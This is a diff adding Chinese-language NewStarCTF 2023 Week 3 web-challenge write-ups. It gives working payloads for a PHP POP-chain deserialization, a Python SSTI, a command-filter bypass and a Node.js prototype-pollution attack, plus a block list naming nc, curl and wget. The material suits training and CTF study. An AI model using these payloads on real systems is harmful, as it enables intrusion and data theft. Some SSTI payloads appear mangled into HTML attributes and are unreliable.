@@ -445,7 +445,7 @@ Successfully created default configuration file "/var/www/html/1.php"
 1=system("cat /flag");
 ```
 
-### \[Week3]medium\_sql
+### \[Week 3]medium\_sql
 
 根据题目描述可以得出需要进行一些绕过，先查看那些关键词被过滤了。
 
@@ -564,6 +564,426 @@ print(a)
 print(b)
 print(c)
 print(d)
+```
+
+### \[Week 3]POP Gadget
+
+源代码
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class Begin{
+    public $name;
+
+    public function __destruct()
+    {
+        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+            echo "Hello";
+        }else{
+            echo "Welcome to NewStarCTF 2023!";
+        }
+    }
+}
+
+class Then{
+    private $func;
+
+    public function __toString()
+    {
+        ($this->func)();
+        return "Good Job!";
+    }
+
+}
+
+class Handle{
+    protected $obj;
+
+    public function __call($func, $vars)
+    {
+        $this->obj->end();
+    }
+
+}
+
+class Super{
+    protected $obj;
+    public function __invoke()
+    {
+        $this->obj->getStr();
+    }
+
+    public function end()
+    {
+        die("==GAME OVER==");
+    }
+}
+
+class CTF{
+    public $handle;
+
+    public function end()
+    {
+        unset($this->handle->log);
+    }
+
+}
+
+class WhiteGod{
+    public $func;
+    public $var;
+
+    public function __unset($var)
+    {
+        ($this->func)($this->var);    
+    }
+}
+
+@unserialize($_POST['pop']);
+```
+
+POP链如下
+
+```
+Begin::__destruct()->Then::__toString()->Super::__invoke()->Handle::__call($func, $vars)->CTF::end()->WhiteGod::__unset($var)
+```
+
+构造 Payload 过程如下
+
+```php
+<?php
+highlight_file(__FILE__);
+
+class Begin{
+    public $name;
+
+    public function __destruct()
+    {
+        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
+            echo "Hello";
+        }else{
+            echo "Welcome to NewStarCTF 2023!";
+        }
+    }
+}
+
+class Then{
+    private $func;
+
+    public function __construct($super)
+    {
+        $this->func = $super;
+    }
+
+    public function __toString()
+    {
+        ($this->func)();
+        return "Good Job!";
+    }
+
+}
+
+class Handle{
+    protected $obj;
+
+    public function __construct($ctf)
+    {
+        $this->obj = $ctf;
+    }
+
+    public function __call($func, $vars)
+    {
+        $this->obj->end();
+    }
+
+}
+
+class Super{
+    protected $obj;
+
+    public function __construct($handle)
+    {
+        $this->obj = $handle;
+    }
+
+    public function __invoke()
+    {
+        $this->obj->getStr();
+    }
+
+    public function end()
+    {
+        die("==GAME OVER==");
+    }
+}
+
+class CTF{
+    public $handle;
+
+    public function end()
+    {
+        unset($this->handle->log);
+    }
+
+}
+
+class WhiteGod{
+    public $func;
+    public $var;
+
+    public function __unset($var)
+    {
+        ($this->func)($this->var);
+    }
+}
+
+@unserialize($_POST['pop']);
+
+$begin = new Begin();
+$ctf = new CTF();
+$handle = new Handle($ctf);
+$super = new Super($handle);
+$begin->name = new Then($super);
+$ctf->handle = new WhiteGod();
+$ctf->handle->func = "system";
+$ctf->handle->var = "cat /flag";
+
+echo urlencode(serialize($begin));
+
+// O%3A5%3A%22Begin%22%3A1%3A%7Bs%3A4%3A%22name%22%3BO%3A4%3A%22Then%22%3A1%3A%7Bs%3A10%3A%22%00Then%00func%22%3BO%3A5%3A%22Super%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A6%3A%22Handle%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00obj%22%3BO%3A3%3A%22CTF%22%3A1%3A%7Bs%3A6%3A%22handle%22%3BO%3A8%3A%22WhiteGod%22%3A2%3A%7Bs%3A4%3A%22func%22%3Bs%3A6%3A%22system%22%3Bs%3A3%3A%22var%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D%7D%7D%7D%7D
+```
+
+### \[Week 3]GenShin
+
+通过查看 Network - Headers 可以发现 Pop 属性值为 `/secr3tofpop` ，通过访问可以得到回显如下
+
+```
+please give a name by get
+```
+
+通过构造 Payload 如下
+
+```
+name=123
+```
+
+可以得到回显如下
+
+```
+Welcome to NewstarCTF 2023 123
+```
+
+猜测应该是 Python 的 SSTI 注入，通过构造 Payload 如下
+
+```
+name={{7*7}}
+```
+
+得到回显如下
+
+```
+big hacker!get away from me!
+```
+
+尝试另外一种 Payload 如下
+
+```
+name=<div data-gb-custom-block data-tag="print" data-0='7' data-1='7' data-2='7' data-3='7'></div>
+
+```
+
+可以得到回显如下
+
+```
+Welcome to NewstarCTF 2023 49
+```
+
+故判断可以通过此方法继续进行 SSTI 注入，通过尝试各种关键字可以发现 `单引号, init, lipsum, url_for, 反斜杠, popen` 被过滤了。
+
+通过构造 Payload 如下
+
+```
+name=
+
+<div data-gb-custom-block data-tag="print" data-0=''></div>
+
+```
+
+可以输出所有的子类，被过滤的关键字可以通过 `|attr()` 进行绕过，由于直接使用 eval 无法使用 chr 函数，因此需要通过在里面多套一层 eval 来实现，由于已经存在单双引号了，所以就直接全用 chr 函数来实现注入吧，生成脚本如下
+
+```python
+string = "__import__('os').popen('cat /flag').read()"
+output = ""
+
+for char in string:
+    output += f"chr({ord(char)})%2b"
+
+print(output)
+"""
+chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41)
+"""
+```
+
+构造 Payload 如下
+
+```
+name=
+
+<div data-gb-custom-block data-tag="print" data-0='' data-1='' data-2='132' data-3='132' data-4='132' data-5='132' data-6='132' data-7='132' data-8='132' data-9='132' data-10='132' data-11='132' data-12='132' data-13='132' data-14='132' data-15='2' data-16='__in' data-17='__in' data-18='+' data-19=')|attr(' data-20='__globals__' data-21='))[' data-22='__builtins__' data-23='].eval(' data-24='95' data-25='95' data-26='95' data-27='95' data-28='95' data-29='5' data-30='2' data-31='2' data-32='2' data-33='95' data-34='95' data-35='95' data-36='5' data-37='2' data-38='2' data-39='2' data-40='105' data-41='105' data-42='5' data-43='2' data-44='2' data-45='2' data-46='109' data-47='109' data-48='9' data-49='2' data-50='2' data-51='2' data-52='112' data-53='112' data-54='12' data-55='2' data-56='2' data-57='2' data-58='111' data-59='111' data-60='11' data-61='2' data-62='2' data-63='2' data-64='114' data-65='114' data-66='14' data-67='2' data-68='2' data-69='2' data-70='116' data-71='116' data-72='16' data-73='2' data-74='2' data-75='2' data-76='95' data-77='95' data-78='95' data-79='5' data-80='2' data-81='2' data-82='2' data-83='95' data-84='95' data-85='95' data-86='5' data-87='2' data-88='2' data-89='2' data-90='40' data-91='40' data-92='40' data-93='0' data-94='2' data-95='2' data-96='2' data-97='39' data-98='39' data-99='39' data-100='9' data-101='2' data-102='2' data-103='2' data-104='111' data-105='111' data-106='11' data-107='2' data-108='2' data-109='2' data-110='115' data-111='115' data-112='15' data-113='2' data-114='2' data-115='2' data-116='39' data-117='39' data-118='39' data-119='9' data-120='2' data-121='2' data-122='2' data-123='41' data-124='41' data-125='41' data-126='1' data-127='2' data-128='2' data-129='2' data-130='46' data-131='46' data-132='46' data-133='6' data-134='2' data-135='2' data-136='2' data-137='112' data-138='112' data-139='12' data-140='2' data-141='2' data-142='2' data-143='111' data-144='111' data-145='11' data-146='2' data-147='2' data-148='2' data-149='112' data-150='112' data-151='12' data-152='2' data-153='2' data-154='2' data-155='101' data-156='101' data-157='1' data-158='2' data-159='2' data-160='2' data-161='110' data-162='110' data-163='10' data-164='2' data-165='2' data-166='2' data-167='40' data-168='40' data-169='40' data-170='0' data-171='2' data-172='2' data-173='2' data-174='39' data-175='39' data-176='39' data-177='9' data-178='2' data-179='2' data-180='2' data-181='99' data-182='99' data-183='99' data-184='9' data-185='2' data-186='2' data-187='2' data-188='97' data-189='97' data-190='97' data-191='7' data-192='2' data-193='2' data-194='2' data-195='116' data-196='116' data-197='16' data-198='2' data-199='2' data-200='2' data-201='32' data-202='32' data-203='32' data-204='2' data-205='2' data-206='2' data-207='2' data-208='47' data-209='47' data-210='47' data-211='7' data-212='2' data-213='2' data-214='2' data-215='102' data-216='102' data-217='2' data-218='2' data-219='2' data-220='2' data-221='108' data-222='108' data-223='8' data-224='2' data-225='2' data-226='2' data-227='97' data-228='97' data-229='97' data-230='7' data-231='2' data-232='2' data-233='2' data-234='103' data-235='103' data-236='3' data-237='2' data-238='2' data-239='2' data-240='39' data-241='39' data-242='39' data-243='9' data-244='2' data-245='2' data-246='2' data-247='41' data-248='41' data-249='41' data-250='1' data-251='2' data-252='2' data-253='2' data-254='46' data-255='46' data-256='46' data-257='6' data-258='2' data-259='2' data-260='2' data-261='114' data-262='114' data-263='14' data-264='2' data-265='2' data-266='2' data-267='101' data-268='101' data-269='1' data-270='2' data-271='2' data-272='2' data-273='97' data-274='97' data-275='97' data-276='7' data-277='2' data-278='2' data-279='2' data-280='100' data-281='100' data-282='0' data-283='2' data-284='2' data-285='2' data-286='40' data-287='40' data-288='40' data-289='0' data-290='2' data-291='2' data-292='2' data-293='41' data-294='41' data-295='41' data-296='1'></div>
+```
+
+即可得到 flag。
+
+### \[Week 3]R!!!C!!!E!!!
+
+源代码如下
+
+```php
+<?php
+highlight_file(__FILE__);
+class minipop{
+    public $code;
+    public $qwejaskdjnlka;
+    public function __toString()
+    {
+        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+            exec($this->code);
+        }
+        return "alright";
+    }
+    public function __destruct()
+    {
+        echo $this->qwejaskdjnlka;
+    }
+}
+if(isset($_POST['payload'])){
+    //wanna try?
+    unserialize($_POST['payload']);
+}
+```
+
+通过 exec 方法可以执行系统命令，因此这题也考的是 Linux 的命令绕过。
+
+由于引号没有进行绕过，所以可以通过引号进行关键字的绕过，构造 Payload 过程如下
+
+```php
+<?php
+highlight_file(__FILE__);
+class minipop{
+    public $code;
+    public $qwejaskdjnlka;
+    public function __toString()
+    {
+        if(!preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $this->code)){
+            exec($this->code);
+        }
+        return "alright";
+    }
+    public function __destruct()
+    {
+        echo $this->qwejaskdjnlka;
+    }
+}
+if(isset($_POST['payload'])){
+    //wanna try?
+    unserialize($_POST['payload']);
+}
+
+$pop = new minipop();
+$pop->qwejaskdjnlka = new minipop();
+$pop->qwejaskdjnlka->code = "cat /flag_is_h3eeere | t''ee 2";
+
+echo serialize($pop);
+// O:7:"minipop":2:{s:4:"code";N;s:13:"qwejaskdjnlka";O:7:"minipop":2:{s:4:"code";s:30:"cat /flag_is_h3eeere | t''ee 2";s:13:"qwejaskdjnlka";N;}}
+```
+
+即可得到 flag。
+
+### \[Week 3]OtenkiGirl
+
+源代码中存在 `hint.txt` 内容如下
+
+```
+『「routes」フォルダーだけを見てください。SQLインジェクションはありません。』と御坂御坂は期待に満ちた気持ちで言った。
+---
+“请只看‘routes’文件夹。没有SQL注入。”御坂御坂满怀期待地说。
+```
+
+在 `routes/info.js` 可以发现该路由用于根据所给的 timestamp 输出该时间戳之后的所有内容。
+
+```javascript
+async function getInfo(timestamp) {
+    timestamp = typeof timestamp === "number" ? timestamp : Date.now();
+    // Remove test data from before the movie was released
+    let minTimestamp = new Date(CONFIG.min_public_time || DEFAULT_CONFIG.min_public_time).getTime();
+    timestamp = Math.max(timestamp, minTimestamp);
+    const data = await sql.all(`SELECT wishid, date, place, contact, reason, timestamp FROM wishes WHERE timestamp >= ?`, [timestamp]).catch(e => { throw e });
+    return data;
+}
+```
+
+在输入 timestamp 后，上述方法会将所输入的 timestamp 与 min\_public\_time 进行对比，其中 `CONFIG.min_public_time` 值不存在，`DEFAULT_CONFIG.min_public_time` 值为 `2019-07-09` ，因此需要通过污染 `min_public_time` 属性才能使其输出 2019-07-09 之前的数据。
+
+minTimestamp 首先会从 `CONFIG` 中获取 `min_public_time` ，获取失败后继续再从 `DEFAULT_CONFIG` 中获取，二者的原型对象都是 `Object` 。
+
+在 `routes/submit.js` 中可以发现原型链污染点：
+
+```javascript
+// L39
+const merge = (dst, src) => {
+    if (typeof dst !== "object" || typeof src !== "object") return dst;
+    for (let key in src) {
+        if (key in dst && key in src) {
+            dst[key] = merge(dst[key], src[key]);
+        } else {
+            dst[key] = src[key];
+        }
+    }
+    return dst;
+}
+
+// L73
+const DEFAULT = {
+    date: "unknown",
+    place: "unknown"
+}
+const result = await insert2db(merge(DEFAULT, data));
+```
+
+在上述代码中，`data` 的值是可控的，能够通过 POST 请求传入。`DEFAULT` 的原型对象也是 `Object` ，因此可以通过 submit 路由来进行污染攻击。
+
+构造 Payload 如下
+
+```json
+{
+    "contact":"a's'd",
+    "reason":"a'd's",
+    "__proto__": {
+        "min_public_time":  "1970-01-01"
+    }
+}
+```
+
+通过访问 `/info/0` 可以得到回显得到 flag 。
+
+```json
+{
+    status: "success",
+    data: [
+        ...,
+        {
+            wishid: "2TrumXdm9HTH9SZvgNPaHmAx",
+            date: "2021-09-27",
+            place: "学園都市",
+            contact: "御坂美琴",
+            reason: "海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag{c2c65ecd-d8d1-4b68-8003-5e608c0dc222}です",
+            timestamp: 1190726040836
+        },
+        ...
+    ]
+}
 ```
 
 ## Misc
